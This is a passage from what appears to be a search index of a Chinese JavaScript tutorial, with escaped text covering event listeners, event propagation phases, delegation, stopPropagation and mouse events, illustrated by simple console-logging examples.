addEventListener ( 'click' , function ( event ) { // \u4e0d\u4f1a\u88ab\u89e6\u53d1 console . log ( 2 ); }); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c stopImmediatePropagation \u65b9\u6cd5\u53ef\u4ee5\u5f7b\u5e95\u53d6\u6d88\u8fd9\u4e2a\u4e8b\u4ef6\uff0c\u4f7f\u5f97\u540e\u9762\u7ed1\u5b9a\u7684\u6240\u6709 click \u76d1\u542c\u51fd\u6570\u90fd\u4e0d\u518d\u89e6\u53d1\u3002\u6240\u4ee5\uff0c\u53ea\u4f1a\u8f93\u51fa1\uff0c\u4e0d\u4f1a\u8f93\u51fa2\u3002","title":"\u4e8b\u4ef6\u6a21\u578b"},{"location":"events/model/#_1","text":"","title":"\u4e8b\u4ef6\u6a21\u578b"},{"location":"events/model/#_2","text":"\u6d4f\u89c8\u5668\u7684\u4e8b\u4ef6\u6a21\u578b\uff0c\u5c31\u662f\u901a\u8fc7\u76d1\u542c\u51fd\u6570\uff08listener\uff09\u5bf9\u4e8b\u4ef6\u505a\u51fa\u53cd\u5e94\u3002\u4e8b\u4ef6\u53d1\u751f\u540e\uff0c\u6d4f\u89c8\u5668\u76d1\u542c\u5230\u4e86\u8fd9\u4e2a\u4e8b\u4ef6\uff0c\u5c31\u4f1a\u6267\u884c\u5bf9\u5e94\u7684\u76d1\u542c\u51fd\u6570\u3002\u8fd9\u662f\u4e8b\u4ef6\u9a71\u52a8\u7f16\u7a0b\u6a21\u5f0f\uff08event-driven\uff09\u7684\u4e3b\u8981\u7f16\u7a0b\u65b9\u5f0f\u3002 JavaScript \u6709\u4e09\u79cd\u65b9\u6cd5\uff0c\u53ef\u4ee5\u4e3a\u4e8b\u4ef6\u7ed1\u5b9a\u76d1\u542c\u51fd\u6570\u3002","title":"\u76d1\u542c\u51fd\u6570"},{"location":"events/model/#html-on-","text":"HTML \u8bed\u8a00\u5141\u8bb8\u5728\u5143\u7d20\u7684\u5c5e\u6027\u4e2d\uff0c\u76f4\u63a5\u5b9a\u4e49\u67d0\u4e9b\u4e8b\u4ef6\u7684\u76d1\u542c\u4ee3\u7801\u3002 1 2 < body onload = \"doSomething()\" > < div onclick = \"console.log('\u89e6\u53d1\u4e8b\u4ef6')\" > \u4e0a\u9762\u4ee3\u7801\u4e3a body \u8282\u70b9\u7684 load \u4e8b\u4ef6\u3001 div \u8282\u70b9\u7684 click \u4e8b\u4ef6\uff0c\u6307\u5b9a\u4e86\u76d1\u542c\u4ee3\u7801\u3002\u4e00\u65e6\u4e8b\u4ef6\u53d1\u751f\uff0c\u5c31\u4f1a\u6267\u884c\u8fd9\u6bb5\u4ee3\u7801\u3002 \u5143\u7d20\u7684\u4e8b\u4ef6\u76d1\u542c\u5c5e\u6027\uff0c\u90fd\u662f on \u52a0\u4e0a\u4e8b\u4ef6\u540d\uff0c\u6bd4\u5982 onload \u5c31\u662f on + load \uff0c\u8868\u793a load \u4e8b\u4ef6\u7684\u76d1\u542c\u4ee3\u7801\u3002 \u6ce8\u610f\uff0c\u8fd9\u4e9b\u5c5e\u6027\u7684\u503c\u662f\u5c06\u4f1a\u6267\u884c\u7684\u4ee3\u7801\uff0c\u800c\u4e0d\u662f\u4e00\u4e2a\u51fd\u6570\u3002 1 2 3 4 5 <!-- \u6b63\u786e --> < body onload = \"doSomething()\" > <!-- \u9519\u8bef --> < body onload = \"doSomething\" > \u4e00\u65e6\u6307\u5b9a\u7684\u4e8b\u4ef6\u53d1\u751f\uff0c on- \u5c5e\u6027\u7684\u503c\u662f\u539f\u6837\u4f20\u5165 JavaScript \u5f15\u64ce\u6267\u884c\u3002\u56e0\u6b64\u5982\u679c\u8981\u6267\u884c\u51fd\u6570\uff0c\u4e0d\u8981\u5fd8\u8bb0\u52a0\u4e0a\u4e00\u5bf9\u5706\u62ec\u53f7\u3002 \u4f7f\u7528\u8fd9\u4e2a\u65b9\u6cd5\u6307\u5b9a\u7684\u76d1\u542c\u4ee3\u7801\uff0c\u53ea\u4f1a\u5728\u5192\u6ce1\u9636\u6bb5\u89e6\u53d1\u3002 1 2 3 < div onclick = \"console.log(2)\" > < button onclick = \"console.log(1)\" > \u70b9\u51fb </ button > </ div > \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c <button> \u662f <div> \u7684\u5b50\u5143\u7d20\u3002 <button> \u7684 click \u4e8b\u4ef6\uff0c\u4e5f\u4f1a\u89e6\u53d1 <div> \u7684 click \u4e8b\u4ef6\u3002\u7531\u4e8e on- \u5c5e\u6027\u7684\u76d1\u542c\u4ee3\u7801\uff0c\u53ea\u5728\u5192\u6ce1\u9636\u6bb5\u89e6\u53d1\uff0c\u6240\u4ee5\u70b9\u51fb\u7ed3\u679c\u662f\u5148\u8f93\u51fa 1 \uff0c\u518d\u8f93\u51fa 2 \uff0c\u5373\u4e8b\u4ef6\u4ece\u5b50\u5143\u7d20\u5f00\u59cb\u5192\u6ce1\u5230\u7236\u5143\u7d20\u3002 \u76f4\u63a5\u8bbe\u7f6e on- \u5c5e\u6027\uff0c\u4e0e\u901a\u8fc7\u5143\u7d20\u8282\u70b9\u7684 setAttribute \u65b9\u6cd5\u8bbe\u7f6e on- \u5c5e\u6027\uff0c\u6548\u679c\u662f\u4e00\u6837\u7684\u3002 1 2 3 el . setAttribute ( 'onclick' , 'doSomething()' ); // \u7b49\u540c\u4e8e // <Element onclick=\"doSomething()\">","title":"HTML \u7684 on- \u5c5e\u6027"},{"location":"events/model/#_3","text":"\u5143\u7d20\u8282\u70b9\u5bf9\u8c61\u7684\u4e8b\u4ef6\u5c5e\u6027\uff0c\u540c\u6837\u53ef\u4ee5\u6307\u5b9a\u76d1\u542c\u51fd\u6570\u3002 1 2 3 4 5 window . onload = doSomething ; div . onclick = function ( event ) { console . log ( '\u89e6\u53d1\u4e8b\u4ef6' ); }; \u4f7f\u7528\u8fd9\u4e2a\u65b9\u6cd5\u6307\u5b9a\u7684\u76d1\u542c\u51fd\u6570\uff0c\u4e5f\u662f\u53ea\u4f1a\u5728\u5192\u6ce1\u9636\u6bb5\u89e6\u53d1\u3002 \u6ce8\u610f\uff0c\u8fd9\u79cd\u65b9\u6cd5\u4e0e HTML \u7684 on- \u5c5e\u6027\u7684\u5dee\u5f02\u662f\uff0c\u5b83\u7684\u503c\u662f\u51fd\u6570\u540d\uff08 doSomething \uff09\uff0c\u800c\u4e0d\u50cf\u540e\u8005\uff0c\u5fc5\u987b\u7ed9\u51fa\u5b8c\u6574\u7684\u76d1\u542c\u4ee3\u7801\uff08 doSomething() \uff09\u3002","title":"\u5143\u7d20\u8282\u70b9\u7684\u4e8b\u4ef6\u5c5e\u6027"},{"location":"events/model/#eventtargetaddeventlistener","text":"\u6240\u6709 DOM \u8282\u70b9\u5b9e\u4f8b\u90fd\u6709 addEventListener \u65b9\u6cd5\uff0c\u7528\u6765\u4e3a\u8be5\u8282\u70b9\u5b9a\u4e49\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 1 window . addEventListener ( 'load' , doSomething , false ); addEventListener \u65b9\u6cd5\u7684\u8be6\u7ec6\u4ecb\u7ecd\uff0c\u53c2\u89c1 EventTarget \u7ae0\u8282\u3002","title":"EventTarget.addEventListener()"},{"location":"events/model/#_4","text":"\u4e0a\u9762\u4e09\u79cd\u65b9\u6cd5\uff0c\u7b2c\u4e00\u79cd\u201cHTML \u7684 on- \u5c5e\u6027\u201d\uff0c\u8fdd\u53cd\u4e86 HTML \u4e0e JavaScript \u4ee3\u7801\u76f8\u5206\u79bb\u7684\u539f\u5219\uff0c\u5c06\u4e24\u8005\u5199\u5728\u4e00\u8d77\uff0c\u4e0d\u5229\u4e8e\u4ee3\u7801\u5206\u5de5\uff0c\u56e0\u6b64\u4e0d\u63a8\u8350\u4f7f\u7528\u3002 \u7b2c\u4e8c\u79cd\u201c\u5143\u7d20\u8282\u70b9\u7684\u4e8b\u4ef6\u5c5e\u6027\u201d\u7684\u7f3a\u70b9\u5728\u4e8e\uff0c\u540c\u4e00\u4e2a\u4e8b\u4ef6\u53ea\u80fd\u5b9a\u4e49\u4e00\u4e2a\u76d1\u542c\u51fd\u6570\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u5982\u679c\u5b9a\u4e49\u4e24\u6b21 onclick \u5c5e\u6027\uff0c\u540e\u4e00\u6b21\u5b9a\u4e49\u4f1a\u8986\u76d6\u524d\u4e00\u6b21\u3002\u56e0\u6b64\uff0c\u4e5f\u4e0d\u63a8\u8350\u4f7f\u7528\u3002 \u7b2c\u4e09\u79cd EventTarget.addEventListener \u662f\u63a8\u8350\u7684\u6307\u5b9a\u76d1\u542c\u51fd\u6570\u7684\u65b9\u6cd5\u3002\u5b83\u6709\u5982\u4e0b\u4f18\u70b9\uff1a \u540c\u4e00\u4e2a\u4e8b\u4ef6\u53ef\u4ee5\u6dfb\u52a0\u591a\u4e2a\u76d1\u542c\u51fd\u6570\u3002 \u80fd\u591f\u6307\u5b9a\u5728\u54ea\u4e2a\u9636\u6bb5\uff08\u6355\u83b7\u9636\u6bb5\u8fd8\u662f\u5192\u6ce1\u9636\u6bb5\uff09\u89e6\u53d1\u76d1\u542c\u51fd\u6570\u3002 \u9664\u4e86 DOM \u8282\u70b9\uff0c\u5176\u4ed6\u5bf9\u8c61\uff08\u6bd4\u5982 window \u3001 XMLHttpRequest \u7b49\uff09\u4e5f\u6709\u8fd9\u4e2a\u63a5\u53e3\uff0c\u5b83\u7b49\u4e8e\u662f\u6574\u4e2a JavaScript \u7edf\u4e00\u7684\u76d1\u542c\u51fd\u6570\u63a5\u53e3\u3002","title":"\u5c0f\u7ed3"},{"location":"events/model/#this","text":"\u76d1\u542c\u51fd\u6570\u5185\u90e8\u7684 this \u6307\u5411\u89e6\u53d1\u4e8b\u4ef6\u7684\u90a3\u4e2a\u5143\u7d20\u8282\u70b9\u3002 1 < button id = \"btn\" onclick = \"console.log(this.id)\" > \u70b9\u51fb </ button > \u6267\u884c\u4e0a\u9762\u4ee3\u7801\uff0c\u70b9\u51fb\u540e\u4f1a\u8f93\u51fa btn \u3002 \u5176\u4ed6\u4e24\u79cd\u76d1\u542c\u51fd\u6570\u7684\u5199\u6cd5\uff0c this \u7684\u6307\u5411\u4e5f\u662f\u5982\u6b64\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // HTML \u4ee3\u7801\u5982\u4e0b // <button id=\"btn\">\u70b9\u51fb</button> var btn = document . getElementById ( 'btn' ); // \u5199\u6cd5\u4e00 btn . onclick = function () { console . log ( this . id ); }; // \u5199\u6cd5\u4e8c btn . addEventListener ( 'click' , function ( e ) { console . log ( this . id ); }, false ); \u4e0a\u9762\u4e24\u79cd\u5199\u6cd5\uff0c\u70b9\u51fb\u6309\u94ae\u4ee5\u540e\u4e5f\u662f\u8f93\u51fa btn \u3002","title":"this \u7684\u6307\u5411"},{"location":"events/model/#_5","text":"\u4e00\u4e2a\u4e8b\u4ef6\u53d1\u751f\u540e\uff0c\u4f1a\u5728\u5b50\u5143\u7d20\u548c\u7236\u5143\u7d20\u4e4b\u95f4\u4f20\u64ad\uff08propagation\uff09\u3002\u8fd9\u79cd\u4f20\u64ad\u5206\u6210\u4e09\u4e2a\u9636\u6bb5\u3002 \u7b2c\u4e00\u9636\u6bb5 \uff1a\u4ece window \u5bf9\u8c61\u4f20\u5bfc\u5230\u76ee\u6807\u8282\u70b9\uff08\u4e0a\u5c42\u4f20\u5230\u5e95\u5c42\uff09\uff0c\u79f0\u4e3a\u201c\u6355\u83b7\u9636\u6bb5\u201d\uff08capture phase\uff09\u3002 \u7b2c\u4e8c\u9636\u6bb5 \uff1a\u5728\u76ee\u6807\u8282\u70b9\u4e0a\u89e6\u53d1\uff0c\u79f0\u4e3a\u201c\u76ee\u6807\u9636\u6bb5\u201d\uff08target phase\uff09\u3002 \u7b2c\u4e09\u9636\u6bb5 \uff1a\u4ece\u76ee\u6807\u8282\u70b9\u4f20\u5bfc\u56de window \u5bf9\u8c61\uff08\u4ece\u5e95\u5c42\u4f20\u56de\u4e0a\u5c42\uff09\uff0c\u79f0\u4e3a\u201c\u5192\u6ce1\u9636\u6bb5\u201d\uff08bubbling phase\uff09\u3002 \u8fd9\u79cd\u4e09\u9636\u6bb5\u7684\u4f20\u64ad\u6a21\u578b\uff0c\u4f7f\u5f97\u540c\u4e00\u4e2a\u4e8b\u4ef6\u4f1a\u5728\u591a\u4e2a\u8282\u70b9\u4e0a\u89e6\u53d1\u3002 1 2 3 < div > < p > \u70b9\u51fb </ p > </ div > \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c <div> \u8282\u70b9\u4e4b\u4e2d\u6709\u4e00\u4e2a <p> \u8282\u70b9\u3002 \u5982\u679c\u5bf9\u8fd9\u4e24\u4e2a\u8282\u70b9\uff0c\u90fd\u8bbe\u7f6e click \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\uff08\u6bcf\u4e2a\u8282\u70b9\u7684\u6355\u83b7\u9636\u6bb5\u548c\u5192\u6ce1\u9636\u6bb5\uff0c\u5404\u8bbe\u7f6e\u4e00\u4e2a\u76d1\u542c\u51fd\u6570\uff09\uff0c\u5171\u8ba1\u8bbe\u7f6e\u56db\u4e2a\u76d1\u542c\u51fd\u6570\u3002\u7136\u540e\uff0c\u5bf9 <p> \u70b9\u51fb\uff0c click \u4e8b\u4ef6\u4f1a\u89e6\u53d1\u56db\u6b21\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 var phases = { 1 : 'capture' , 2 : 'target' , 3 : 'bubble' }; var div = document . querySelector ( 'div' ); var p = document . querySelector ( 'p' ); div . addEventListener ( 'click' , callback , true ); p . addEventListener ( 'click' , callback , true ); div . addEventListener ( 'click' , callback , false ); p . addEventListener ( 'click' , callback , false ); function callback ( event ) { var tag = event . currentTarget . tagName ; var phase = phases [ event . eventPhase ]; console . log ( \"Tag: '\" + tag + \"'. EventPhase: '\" + phase + \"'\" ); } // \u70b9\u51fb\u4ee5\u540e\u7684\u7ed3\u679c // Tag: 'DIV'. EventPhase: 'capture' // Tag: 'P'. EventPhase: 'target' // Tag: 'P'. EventPhase: 'target' // Tag: 'DIV'. EventPhase: 'bubble' \u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c click \u4e8b\u4ef6\u88ab\u89e6\u53d1\u4e86\u56db\u6b21\uff1a <div> \u8282\u70b9\u7684\u6355\u83b7\u9636\u6bb5\u548c\u5192\u6ce1\u9636\u6bb5\u54041\u6b21\uff0c <p> \u8282\u70b9\u7684\u76ee\u6807\u9636\u6bb5\u89e6\u53d1\u4e862\u6b21\u3002 \u6355\u83b7\u9636\u6bb5\uff1a\u4e8b\u4ef6\u4ece <div> \u5411 <p> \u4f20\u64ad\u65f6\uff0c\u89e6\u53d1 <div> \u7684 click \u4e8b\u4ef6\uff1b \u76ee\u6807\u9636\u6bb5\uff1a\u4e8b\u4ef6\u4ece <div> \u5230\u8fbe <p> \u65f6\uff0c\u89e6\u53d1 <p> \u7684 click \u4e8b\u4ef6\uff1b \u5192\u6ce1\u9636\u6bb5\uff1a\u4e8b\u4ef6\u4ece <p> \u4f20\u56de <div> \u65f6\uff0c\u518d\u6b21\u89e6\u53d1 <div> \u7684 click \u4e8b\u4ef6\u3002 \u5176\u4e2d\uff0c <p> \u8282\u70b9\u6709\u4e24\u4e2a\u76d1\u542c\u51fd\u6570\uff08 addEventListener \u65b9\u6cd5\u7b2c\u4e09\u4e2a\u53c2\u6570\u7684\u4e0d\u540c\uff0c\u4f1a\u5bfc\u81f4\u7ed1\u5b9a\u4e24\u4e2a\u76d1\u542c\u51fd\u6570\uff09\uff0c\u56e0\u6b64\u5b83\u4eec\u90fd\u4f1a\u56e0\u4e3a click \u4e8b\u4ef6\u89e6\u53d1\u4e00\u6b21\u3002\u6240\u4ee5\uff0c <p> \u4f1a\u5728 target \u9636\u6bb5\u6709\u4e24\u6b21\u8f93\u51fa\u3002 \u6ce8\u610f\uff0c\u6d4f\u89c8\u5668\u603b\u662f\u5047\u5b9a click \u4e8b\u4ef6\u7684\u76ee\u6807\u8282\u70b9\uff0c\u5c31\u662f\u70b9\u51fb\u4f4d\u7f6e\u5d4c\u5957\u6700\u6df1\u7684\u90a3\u4e2a\u8282\u70b9\uff08\u672c\u4f8b\u662f <div> \u8282\u70b9\u91cc\u9762\u7684 <p> \u8282\u70b9\uff09\u3002\u6240\u4ee5\uff0c <p> \u8282\u70b9\u7684\u6355\u83b7\u9636\u6bb5\u548c\u5192\u6ce1\u9636\u6bb5\uff0c\u90fd\u4f1a\u663e\u793a\u4e3a target \u9636\u6bb5\u3002 \u4e8b\u4ef6\u4f20\u64ad\u7684\u6700\u4e0a\u5c42\u5bf9\u8c61\u662f window \uff0c\u63a5\u7740\u4f9d\u6b21\u662f document \uff0c html \uff08 document.documentElement \uff09\u548c body \uff08 document.body \uff09\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u4e0a\u4f8b\u7684\u4e8b\u4ef6\u4f20\u64ad\u987a\u5e8f\uff0c\u5728\u6355\u83b7\u9636\u6bb5\u4f9d\u6b21\u4e3a window \u3001 document \u3001 html \u3001 body \u3001 div \u3001 p \uff0c\u5728\u5192\u6ce1\u9636\u6bb5\u4f9d\u6b21\u4e3a p \u3001 div \u3001 body \u3001 html \u3001 document \u3001 window \u3002","title":"\u4e8b\u4ef6\u7684\u4f20\u64ad"},{"location":"events/model/#_6","text":"\u7531\u4e8e\u4e8b\u4ef6\u4f1a\u5728\u5192\u6ce1\u9636\u6bb5\u5411\u4e0a\u4f20\u64ad\u5230\u7236\u8282\u70b9\uff0c\u56e0\u6b64\u53ef\u4ee5\u628a\u5b50\u8282\u70b9\u7684\u76d1\u542c\u51fd\u6570\u5b9a\u4e49\u5728\u7236\u8282\u70b9\u4e0a\uff0c\u7531\u7236\u8282\u70b9\u7684\u76d1\u542c\u51fd\u6570\u7edf\u4e00\u5904\u7406\u591a\u4e2a\u5b50\u5143\u7d20\u7684\u4e8b\u4ef6\u3002\u8fd9\u79cd\u65b9\u6cd5\u53eb\u505a\u4e8b\u4ef6\u7684\u4ee3\u7406\uff08delegation\uff09\u3002 1 2 3 4 5 6 7 var ul = document . querySelector ( 'ul' ); ul . addEventListener ( 'click' , function ( event ) { if ( event . target . tagName . toLowerCase () === 'li' ) { // some code } }); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c click \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u5b9a\u4e49\u5728 <ul> \u8282\u70b9\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\uff0c\u5b83\u5904\u7406\u7684\u662f\u5b50\u8282\u70b9 <li> \u7684 click \u4e8b\u4ef6\u3002\u8fd9\u6837\u505a\u7684\u597d\u5904\u662f\uff0c\u53ea\u8981\u5b9a\u4e49\u4e00\u4e2a\u76d1\u542c\u51fd\u6570\uff0c\u5c31\u80fd\u5904\u7406\u591a\u4e2a\u5b50\u8282\u70b9\u7684\u4e8b\u4ef6\uff0c\u800c\u4e0d\u7528\u5728\u6bcf\u4e2a <li> \u8282\u70b9\u4e0a\u5b9a\u4e49\u76d1\u542c\u51fd\u6570\u3002\u800c\u4e14\u4ee5\u540e\u518d\u6dfb\u52a0\u5b50\u8282\u70b9\uff0c\u76d1\u542c\u51fd\u6570\u4f9d\u7136\u6709\u6548\u3002 \u5982\u679c\u5e0c\u671b\u4e8b\u4ef6\u5230\u67d0\u4e2a\u8282\u70b9\u4e3a\u6b62\uff0c\u4e0d\u518d\u4f20\u64ad\uff0c\u53ef\u4ee5\u4f7f\u7528\u4e8b\u4ef6\u5bf9\u8c61\u7684 stopPropagation \u65b9\u6cd5\u3002 1 2 3 4 5 6 7 8 9 // \u4e8b\u4ef6\u4f20\u64ad\u5230 p \u5143\u7d20\u540e\uff0c\u5c31\u4e0d\u518d\u5411\u4e0b\u4f20\u64ad\u4e86 p . addEventListener ( 'click' , function ( event ) { event . stopPropagation (); }, true ); // \u4e8b\u4ef6\u5192\u6ce1\u5230 p \u5143\u7d20\u540e\uff0c\u5c31\u4e0d\u518d\u5411\u4e0a\u5192\u6ce1\u4e86 p . addEventListener ( 'click' , function ( event ) { event . stopPropagation (); }, false ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c stopPropagation \u65b9\u6cd5\u5206\u522b\u5728\u6355\u83b7\u9636\u6bb5\u548c\u5192\u6ce1\u9636\u6bb5\uff0c\u963b\u6b62\u4e86\u4e8b\u4ef6\u7684\u4f20\u64ad\u3002 \u4f46\u662f\uff0c stopPropagation \u65b9\u6cd5\u53ea\u4f1a\u963b\u6b62\u4e8b\u4ef6\u7684\u4f20\u64ad\uff0c\u4e0d\u4f1a\u963b\u6b62\u8be5\u4e8b\u4ef6\u89e6\u53d1 <p> \u8282\u70b9\u7684\u5176\u4ed6 click \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u4e0d\u662f\u5f7b\u5e95\u53d6\u6d88 click \u4e8b\u4ef6\u3002 1 2 3 4 5 6 7 8 9 p . addEventListener ( 'click' , function ( event ) { event . stopPropagation (); console . log ( 1 ); }); p . addEventListener ( 'click' , function ( event ) { // \u4f1a\u89e6\u53d1 console . log ( 2 ); }); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c p \u5143\u7d20\u7ed1\u5b9a\u4e86\u4e24\u4e2a click \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 stopPropagation \u65b9\u6cd5\u53ea\u80fd\u963b\u6b62\u8fd9\u4e2a\u4e8b\u4ef6\u7684\u4f20\u64ad\uff0c\u4e0d\u80fd\u53d6\u6d88\u8fd9\u4e2a\u4e8b\u4ef6\uff0c\u56e0\u6b64\uff0c\u7b2c\u4e8c\u4e2a\u76d1\u542c\u51fd\u6570\u4f1a\u89e6\u53d1\u3002\u8f93\u51fa\u7ed3\u679c\u4f1a\u5148\u662f1\uff0c\u7136\u540e\u662f2\u3002 \u5982\u679c\u60f3\u8981\u5f7b\u5e95\u53d6\u6d88\u8be5\u4e8b\u4ef6\uff0c\u4e0d\u518d\u89e6\u53d1\u540e\u9762\u6240\u6709 click \u7684\u76d1\u542c\u51fd\u6570\uff0c\u53ef\u4ee5\u4f7f\u7528 stopImmediatePropagation \u65b9\u6cd5\u3002 1 2 3 4 5 6 7 8 9 p . addEventListener ( 'click' , function ( event ) { event . stopImmediatePropagation (); console . log ( 1 ); }); p . addEventListener ( 'click' , function ( event ) { // \u4e0d\u4f1a\u88ab\u89e6\u53d1 console . log ( 2 ); }); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c stopImmediatePropagation \u65b9\u6cd5\u53ef\u4ee5\u5f7b\u5e95\u53d6\u6d88\u8fd9\u4e2a\u4e8b\u4ef6\uff0c\u4f7f\u5f97\u540e\u9762\u7ed1\u5b9a\u7684\u6240\u6709 click \u76d1\u542c\u51fd\u6570\u90fd\u4e0d\u518d\u89e6\u53d1\u3002\u6240\u4ee5\uff0c\u53ea\u4f1a\u8f93\u51fa1\uff0c\u4e0d\u4f1a\u8f93\u51fa2\u3002","title":"\u4e8b\u4ef6\u7684\u4ee3\u7406"},{"location":"events/mouse/","text":"\u9f20\u6807\u4e8b\u4ef6 \u00b6 \u9f20\u6807\u4e8b\u4ef6\u7684\u79cd\u7c7b \u00b6 \u9f20\u6807\u4e8b\u4ef6\u4e3b\u8981\u6709\u4e0b\u9762\u8fd9\u4e9b\uff0c\u6240\u6709\u4e8b\u4ef6\u90fd\u7ee7\u627f\u4e86 MouseEvent \u63a5\u53e3\uff08\u8be6\u89c1\u540e\u6587\uff09\u3002 \uff081\uff09\u70b9\u51fb\u4e8b\u4ef6 \u9f20\u6807\u70b9\u51fb\u76f8\u5173\u7684\u6709\u56db\u4e2a\u4e8b\u4ef6\u3002 click \uff1a\u6309\u4e0b\u9f20\u6807\uff08\u901a\u5e38\u662f\u6309\u4e0b\u4e3b\u6309\u94ae\uff09\u65f6\u89e6\u53d1\u3002 dblclick \uff1a\u5728\u540c\u4e00\u4e2a\u5143\u7d20\u4e0a\u53cc\u51fb\u9f20\u6807\u65f6\u89e6\u53d1\u3002 mousedown \uff1a\u6309\u4e0b\u9f20\u6807\u952e\u65f6\u89e6\u53d1\u3002 mouseup \uff1a\u91ca\u653e\u6309\u4e0b\u7684\u9f20\u6807\u952e\u65f6\u89e6\u53d1\u3002 click \u4e8b\u4ef6\u53ef\u4ee5\u770b\u6210\u662f\u4e24\u4e2a\u4e8b\u4ef6\u7ec4\u6210\u7684\uff1a\u7528\u6237\u5728\u540c\u4e00\u4e2a\u4f4d\u7f6e\u5148\u89e6\u53d1 mousedown \uff0c\u518d\u89e6\u53d1 mouseup \u3002\u56e0\u6b64\uff0c\u89e6\u53d1\u987a\u5e8f\u662f\uff0c mousedown \u9996\u5148\u89e6\u53d1\uff0c mouseup \u63a5\u7740\u89e6\u53d1\uff0c click \u6700\u540e\u89e6\u53d1\u3002 \u53cc\u51fb\u65f6\uff0c dblclick \u4e8b\u4ef6\u5219\u4f1a\u5728 mousedown \u3001 mouseup \u3001 click \u4e4b\u540e\u89e6\u53d1\u3002 \uff082\uff09\u79fb\u52a8\u4e8b\u4ef6 \u9f20\u6807\u79fb\u52a8\u76f8\u5173\u7684\u6709\u4e94\u4e2a\u4e8b\u4ef6\u3002 mousemove \uff1a\u5f53\u9f20\u6807\u5728\u4e00\u4e2a\u8282\u70b9\u5185\u90e8\u79fb\u52a8\u65f6\u89e6\u53d1\u3002\u5f53\u9f20\u6807\u6301\u7eed\u79fb\u52a8\u65f6\uff0c\u8be5\u4e8b\u4ef6\u4f1a\u8fde\u7eed\u89e6\u53d1\u3002\u4e3a\u4e86\u907f\u514d\u6027\u80fd\u95ee\u9898\uff0c\u5efa\u8bae\u5bf9\u8be5\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u505a\u4e00\u4e9b\u9650\u5b9a\uff0c\u6bd4\u5982\u9650\u5b9a\u4e00\u6bb5\u65f6\u95f4\u5185\u53ea\u80fd\u8fd0\u884c\u4e00\u6b21\u3002 mouseenter \uff1a\u9f20\u6807\u8fdb\u5165\u4e00\u4e2a\u8282\u70b9\u65f6\u89e6\u53d1\uff0c\u8fdb\u5165\u5b50\u8282\u70b9\u4e0d\u4f1a\u89e6\u53d1\u8fd9\u4e2a\u4e8b\u4ef6\uff08\u8be6\u89c1\u540e\u6587\uff09\u3002 mouseover \uff1a\u9f20\u6807\u8fdb\u5165\u4e00\u4e2a\u8282\u70b9\u65f6\u89e6\u53d1\uff0c\u8fdb\u5165\u5b50\u8282\u70b9\u4f1a\u518d\u4e00\u6b21\u89e6\u53d1\u8fd9\u4e2a\u4e8b\u4ef6\uff08\u8be6\u89c1\u540e\u6587\uff09\u3002 mouseout \uff1a\u9f20\u6807\u79bb\u5f00\u4e00\u4e2a\u8282\u70b9\u65f6\u89e6\u53d1\uff0c\u79bb\u5f00\u7236\u8282\u70b9\u4e5f\u4f1a\u89e6\u53d1\u8fd9\u4e2a\u4e8b\u4ef6\uff08\u8be6\u89c1\u540e\u6587\uff09\u3002 mouseleave \uff1a\u9f20\u6807\u79bb\u5f00\u4e00\u4e2a\u8282\u70b9\u65f6\u89e6\u53d1\uff0c\u79bb\u5f00\u7236\u8282\u70b9\u4e0d\u4f1a\u89e6\u53d1\u8fd9\u4e2a\u4e8b\u4ef6\uff08\u8be6\u89c1\u540e\u6587\uff09\u3002 mouseover \u4e8b\u4ef6\u548c mouseenter \u4e8b\u4ef6\uff0c\u90fd\u662f\u9f20\u6807\u8fdb\u5165\u4e00\u4e2a\u8282\u70b9\u65f6\u89e6\u53d1\u3002\u4e24\u8005\u7684\u533a\u522b\u662f\uff0c mouseenter \u4e8b\u4ef6\u53ea\u89e6\u53d1\u4e00\u6b21\uff0c\u800c\u53ea\u8981\u9f20\u6807\u5728\u8282\u70b9\u5185\u90e8\u79fb\u52a8\uff0c mouseover \u4e8b\u4ef6\u4f1a\u5728\u5b50\u8282\u70b9\u4e0a\u89e6\u53d1\u591a\u6b21\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 /* HTML \u4ee3\u7801\u5982\u4e0b <ul> <li>item 1</li> <li>item 2</li> <li>item 3</li> </ul> */ var ul = document . querySelector ( 'ul' ); // \u8fdb\u5165 ul \u8282\u70b9\u4ee5\u540e\uff0cmouseenter \u4e8b\u4ef6\u53ea\u4f1a\u89e6\u53d1\u4e00\u6b21 // \u4ee5\u540e\u53ea\u8981\u9f20\u6807\u5728\u8282\u70b9\u5185\u79fb\u52a8\uff0c\u90fd\u4e0d\u4f1a\u518d\u89e6\u53d1\u8fd9\u4e2a\u4e8b\u4ef6 // event.target \u662f ul \u8282\u70b9 ul . addEventListener ( 'mouseenter' , function ( event ) { event . target . style . color = 'purple' ; setTimeout ( function () { event . target . style . color = '' ; }, 500 ); }, false ); // \u8fdb\u5165 ul \u8282\u70b9\u4ee5\u540e\uff0c\u53ea\u8981\u5728\u5b50\u8282\u70b9\u4e0a\u79fb\u52a8\uff0cmouseover \u4e8b\u4ef6\u4f1a\u89e6\u53d1\u591a\u6b21 // event.target \u662f li \u8282\u70b9 ul . addEventListener ( 'mouseover' , function ( event ) { event . target . style . color = 'orange' ; setTimeout ( function () { event . target . style . color = '' ; }, 500 ); }, false ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5728\u7236\u8282\u70b9\u5185\u90e8\u8fdb\u5165\u5b50\u8282\u70b9\uff0c\u4e0d\u4f1a\u89e6\u53d1 mouseenter 